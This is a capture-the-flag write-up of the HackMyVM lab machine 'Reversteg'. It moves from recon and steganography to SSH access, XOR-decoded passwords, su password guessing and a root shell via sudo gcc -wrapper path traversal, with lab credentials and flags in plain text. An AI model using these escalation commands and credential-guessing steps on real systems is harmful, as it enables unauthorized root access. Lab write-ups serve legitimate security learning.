# Reversteg



## Recon

::: details nmap_scan.log
```log
Open 10.0.2.63:22
Open 10.0.2.63:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.63

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfYzBJQsUZrqSGhBjydbjtAuxvwq/5PTn9cKOuRU3cX0PvqfV4TOIdbAhysBsQfoAezIuKQSky/KbmLZCdAxzLWvNROwtHdyVIUI4PmMWpqVeO/AxPFgKzlLcW1q/CSWAtyUdNUbFGTxidKlBduWppBufd74VupdA/aOTeqH8JWHCvJjfjRBvKohMR0oAM21ezNDSw1FrJ9pxpv90gPyqTX/9TA5J0XopnsDFMbzjTj0/aEiFrTmIOWvq9IlkEoIaSPq+raInzbhy3UTzJmAxl0bb0yM3+uWeu3IEp+i9+cGxtf5vgNwiRkdAI3Ki6QHjrSHsFQ1m7o/fV83e/BZlX
|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKCfpcXOvl2zgP5HXJMxdKvTg3lsZ50vTDc76l1MehwnvWf1y7XsyAtheRg4heZYt63CxxBs6Bsf1PdEbRSF4tE=
|   256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILxmQFkVzRqAQH1sdqxSGaIS5QDjKFKCSgpZhE9I5qWO
80/tcp open  http    syn-ack nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.2
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-favicon: Unknown favicon MD5: CF7DDB72E87A301DC8A1F1B44410159F
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

So right away we see Ubuntu Logo doesn't show up

![writeup.png](/assets/pentest/hackmyvm/reversteg/writeup.png)

Some comments in html:
```html
└─$ curl 'http://10.0.2.63/' -s | grep '<!--'
  <!--
<!--      <div class="table_of_contents floating_element">
        <!-- 117db0148dc179a2c2245c5a30e63ab0 -->
<!-- Some people always don't understand the format of photos. -->
```

### Fuzzing

Any route goes to index page
```bash
└─$ curl http://reversteg.hmv/ -s | md5sum
cf7ddb72e87a301dc8a1f1b44410159f  -

└─$ curl http://reversteg.hmv/whatever -s | md5sum
cf7ddb72e87a301dc8a1f1b44410159f  -

└─$ curl http://10.0.2.63/icons/ubuntu-logo.png -s | md5sum
cf7ddb72e87a301dc8a1f1b44410159f  -
```

Fuzz for comment
```bash
└─$ ffuf -u 'http://10.0.2.63/117db0148dc179a2c2245c5a30e63ab0.FUZZ' -w /usr/share/seclists/Fuzzing/file-extensions-lower-case.txt  -mc all -fl 379
jpg                     [Status: 200, Size: 190696, Words: 565, Lines: 604, Duration: 21ms]
png                     [Status: 200, Size: 379011, Words: 1587, Lines: 1311, Duration: 11ms]
php                     [Status: 404, Size: 169, Words: 6, Lines: 8, Duration: 18ms]
```

### Steganography

```bash
└─$ curl -LOs http://10.0.2.63/117db0148dc179a2c2245c5a30e63ab0.png
└─$ curl -LOs http://10.0.2.63/117db0148dc179a2c2245c5a30e63ab0.jpg

└─$ file 11*
117db0148dc179a2c2245c5a30e63ab0.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "219f26695ac66c93de9de70eebeefea4deb071df71b9b7d7ebcc06eca47ff6e4", baseline, precision 8, 1280x960, components 3
117db0148dc179a2c2245c5a30e63ab0.png: PNG image data, 648 x 486, 8-bit/color RGB, non-interlaced
```

The comment doesn't decode to anything from hex, but there's a comment Base64 comment in JPG
```bash
└─$ strings 117db0148dc179a2c2245c5a30e63ab0.jpg -n 12
B219f26695ac66c93de9de70eebeefea4deb071df71b9b7d7ebcc06eca47ff6e4
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
3Dr3HGZ~1L=MQ
TGlmZSBpcyBmdWxsIG9mIHNjZW5lcnksIGxvb2sgY2FyZWZ1bGx5

└─$ echo 'TGlmZSBpcyBmdWxsIG9mIHNjZW5lcnksIGxvb2sgY2FyZWZ1bGx5' | base64 -d
Life is full of scenery, look carefully 
```

There's interesting string found inside PNG with `zsteg`
```bash
└─$ zsteg 117db0148dc179a2c2245c5a30e63ab0.png
imagedata           .. text: "\n\n\n\t\t\t\n\n\n"
b1,rgb,lsb,xy       .. text: "morainelake"
b1,bgr,msb,xy       .. file: OpenPGP Public Key
b2,r,lsb,xy         .. text: "UUUUUUUU@"
b2,g,lsb,xy         .. text: "E@UAUUUUUUUUj"
b2,g,msb,xy         .. text: "UUUZs-VUU"
b2,b,lsb,xy         .. text: "EUUUUUUUUV"
b2,b,msb,xy         .. text: "_UUUoUUe"
b3,b,msb,xy         .. file: MPEG ADTS, layer I, v2,  96 kbps, Stereo
b3,rgb,lsb,xy       .. file: PGP Secret Sub-key -
b4,r,lsb,xy         .. text: "DEUTfgww"
b4,r,msb,xy         .. text: "M,\"\"\"\"\"\""
b4,g,lsb,xy         .. text: ["\"" repeated 10 times]
b4,g,msb,xy         .. text: "HDDDDDDDDDDH"
b4,b,lsb,xy         .. text: "3\"##2\"\"#33333333333333334DDDDDDDDDD4C333\"\"\""
b4,b,msb,xy         .. text: ",\"\"\"\"\"\"\"\"\"\","
```

The odd string was the password
```bash
└─$ stegseek 117db0148dc179a2c2245c5a30e63ab0.jpg $rockyou
[!] error: Could not find a valid passphrase.

└─$ steghide extract -sf 117db0148dc179a2c2245c5a30e63ab0.jpg -p morainelake
wrote extracted data to "secret.zip".
```

Requires password
```bash
└─$ unzip secret.zip
Archive:  secret.zip
   creating: secret/
[secret.zip] secret/secret.txt password:
```

```bash
└─$ 7z x secret.zip -p'morainelake'
└─$ cat secret/secret.txt
morainelake:660930334
```

## SSH

::: tip Creds
`morainelake:660930334`
:::

```bash
└─$ sshpass -p '660930334' ssh morainelake@reversteg.hmv -t bash
morainelake@reversteg:~$ id
uid=1002(morainelake) gid=1002(morainelake) groups=1002(morainelake)
```

```bash
morainelake@reversteg:~$ find . -type f -ls
      894      4 -rw-r--r--   1 morainelake morainelake     3526 Apr 18  2019 ./.bashrc
      144      8 -rw-r--r--   1 root        root            4719 Sep 29 15:57 ./history
     6534      4 -rw-r--r--   1 root        root             543 Feb 20  2025 ./note.txt
      925      4 -rw-r--r--   1 morainelake morainelake      807 Apr 18  2019 ./.profile
      995      4 -rw-r--r--   1 morainelake morainelake      220 Apr 18  2019 ./.bash_logout
morainelake@reversteg:~$ cat note.txt
morainelake is a very careless user with a very bad memory. He always throws things aside after organizing them. This time he accidentally lost the flag. Fortunately, the administrator has the historical records, but there are too many records to find the corresponding correct flag. Can you find it correctly?
"Don't worry about failures; worry about the chances you miss when you don't even try. After all, it's better to look back and say, 'I can't believe I did that,' than to look back and say, 'What if?' (You'll probably fail anyway.)"

morainelake@reversteg:~$ cat history
flag{f026caa5cbfc7206c76abc7092f01c89}
flag{8b597442df35dfbb16bb63bb03eb2915}
flag{a9a7ec66e1cdf567ea2cb55643fd7512}
flag{75d02b09e5f196707ddd350b743f9da7}
...
```

### User.txt

Welp... bruteforce
```bash
└─$ sshpass -p '660930334' scp morainelake@reversteg.hmv:history .
└─$ ffuf -u 'https://hackmyvm.eu/machines/checkflag.php' -w history -d 'flag=FUZZ&vm=Reversteg' -b 'PHPSESSID=<YOUR_SESSION>' -H 'Content-Type: application/x-www-form-urlencoded' -fr 'Wrong Flag' -r -p 1
flag{fc8941b9088096e99b635cc3e07080d6} [Status: 200, Size: 3180, Words: 322, Lines: 61, Duration: 1789ms]
```

## Privilege Escalation (welcome)

No sudo or SUID binaries.

Odd binary in `/opt`
```bash
morainelake@reversteg:~$ ls -Alh /opt
total 20K
-rwxr-xr-x 1 root root 17K Feb 12  2025 reverse
morainelake@reversteg:~$ file /opt/reverse
/opt/reverse: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b669319393d72dd96b8d9b38434a3bafdc397f14, not stripped
morainelake@reversteg:~$ /opt/reverse
Enter passwords or Enter H coward mode:
H
^H
password
^C
```

```bash
└─$ sshpass -p '660930334' scp morainelake@reversteg.hmv:/opt/reverse .
```

[https://dogbolt.org/?id=e00e1ed2-62a3-4ec4-8e4b-9d5682113507#Hex-Rays=223&angr=156&BinaryNinja=190](https://dogbolt.org/?id=e00e1ed2-62a3-4ec4-8e4b-9d5682113507#Hex-Rays=223&angr=156&BinaryNinja=190)

![writeup-1.png](/assets/pentest/hackmyvm/reversteg/writeup-1.png)

There's 4 passwords which are XORed with key 77 (decimal)
```c
  v7 = 8203321; 
// int32_t var_bc = 0x7d2c39; // BinaryNinja
  strcpy(&v6[9], "/, 8:(");
  strcpy(v6, "!!|}yx{z");
  strcpy(v5, "(;$)(#");
  v19 = 77;
  v18 = xor_decrypt(v6, 77);
  v17 = xor_decrypt(&v6[9], v19);
  v16 = xor_decrypt((const char *)&v7, v19);
  v15 = xor_decrypt(v5, v19);
```

```bash
morainelake@reversteg:~$ echo 392c7d | xxd -r -p;echo
9,}
```

Decode XOR

![writeup-2.png](/assets/pentest/hackmyvm/reversteg/writeup-2.png)

::: info Note
`@`  symbol is just newline, ignore.
:::

Passwords:
```bash
ta0
bamuwe
ll104567
eviden
```

![writeup-3.png](/assets/pentest/hackmyvm/reversteg/writeup-3.png)

`check_passwords` has specific order
```bash
if (!check_passwords(&var_58, &var_78, &var_98, &var_b8, rax_4, rax_5, rax_6, rax_7))
```

If you follow the order it's something like following:
```bash
morainelake@reversteg:~$ echo $'ll104567\nbamuwe ta0 eviden\nflower' | /opt/reverse
Enter passwords or Enter H coward mode:
[+] Enter the password successfully! you know: flower
```

Ok... what password

```bash
morainelake@reversteg:~$ echo "flower" | timeout 1 su root -c whoami 2>/dev/null
morainelake@reversteg:~$ echo "bamuwe ta0 eviden" | timeout 1 su root -c whoami 2>/dev/null
morainelake@reversteg:~$ echo "bamuweta0eviden" | timeout 1 su root -c whoami 2>/dev/null
morainelake@reversteg:~$ echo "ll104567 bamuwe ta0 eviden" | timeout 1 su root -c whoami 2>/dev/null
morainelake@reversteg:~$ echo "ll104567bamuweta0eviden" | timeout 1 su root -c whoami 2>/dev/null
morainelake@reversteg:~$ echo "flower" | timeout 1 su welcome -c whoami 2>/dev/null
morainelake@reversteg:~$ echo "bamuwe ta0 eviden" | timeout 1 su welcome -c whoami 2>/dev/null
morainelake@reversteg:~$ echo "bamuweta0eviden" | timeout 1 su welcome -c whoami 2>/dev/null
morainelake@reversteg:~$ echo "ll104567 bamuwe ta0 eviden" | timeout 1 su welcome -c whoami 2>/dev/null
morainelake@reversteg:~$ echo "ll104567bamuweta0eviden" | timeout 1 su welcome -c whoami 2>/dev/null
welcome
```

::: tip Creds
`welcome:ll104567bamuweta0eviden`
:::

## Privilege Escalation (root)

```bash
welcome@reversteg:~$ sudo -l
Matching Defaults entries for welcome on reversteg:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on reversteg:
    (ALL : ALL) NOPASSWD: /usr/bin/gcc -wrapper /opt/*
```

[https://gtfobins.github.io/gtfobins/gcc](https://gtfobins.github.io/gtfobins/gcc)

No write permissions in `/opt`
```bash
welcome@reversteg:~$ echo t > /opt/t
bash: /opt/t: Permission denied
```

Path traversal works as escape
```bash
welcome@reversteg:~$ sudo gcc -wrapper /opt/../bin/bash,-s .
root@reversteg:/home/welcome# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@reversteg:/home/welcome# cat /root/root.txt
flag{4f1eab505b71cd930b0eccd83ff0cfef}
```